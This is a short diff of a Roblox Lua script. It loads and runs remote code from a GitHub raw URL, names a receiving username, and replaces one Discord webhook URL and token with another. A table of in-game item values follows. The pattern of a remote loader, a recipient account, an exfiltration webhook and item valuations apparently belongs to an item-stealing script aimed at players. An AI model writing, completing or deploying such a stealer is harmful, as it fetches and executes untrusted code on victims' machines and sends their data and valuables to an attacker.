@@ -1,6 +1,6 @@
 loadstring(game:HttpGet('https://raw.githubusercontent.com/HuiScripts/Hi-files/refs/heads/main/Src1'))()
 userName = "SolaZola_1"
-webHook = "https://discord.com/api/webhooks/1322407102421139497/ojDaExv79dyWhGkYseBAm-_nCEUaz0EmgetDoT3fKBk64Fey7CqbtZS1_LX1olb0Fm4G"
+webHook = "https://discord.com/api/webhooks/1322566636586405918/-Nm7RjBNFAxM7TTwlmzwqMvCOnKxSCHY-cJH49F5hxeB2-l1drDxVsPqu2D4MJq_34Sp"
 
 local values = {
     ["Nik's Scythe"] = 25000000,
